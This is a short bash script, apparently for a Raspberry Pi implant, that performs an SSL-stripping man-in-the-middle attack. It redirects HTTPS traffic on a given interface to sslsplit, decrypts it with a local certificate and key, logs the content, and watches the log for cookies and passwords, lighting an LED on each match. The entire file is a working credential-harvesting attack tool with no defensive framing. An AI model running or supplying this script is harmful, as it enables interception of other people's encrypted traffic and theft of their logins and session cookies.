#!/bin/bash

echo '[*] SSL splitting'
HOME='/home/pi/'

[[ $(iptables -t nat -vnL PREROUTING | grep "$1" | grep 443) = '' ]] && {
	iptables -t nat -A PREROUTING -i "$1" -p tcp --dport 443 -j REDIRECT --to-ports 1080
}

[[ $(pgrep /usr/bin/sslsplit) = '' ]] && {
	screen -dmS sslsplit sslsplit -k $HOME/key.pem -c $HOME/cert.pem -l $HOME/con.log -L $HOME/data.log -P autossl 0.0.0.0 1080
}

tail -f $HOME/data.log | grep -ai -e cookie -e passw | while read match
do
	echo $match | grep -ai -e cookie -e passw
	led yellow on 2> /dev/null
done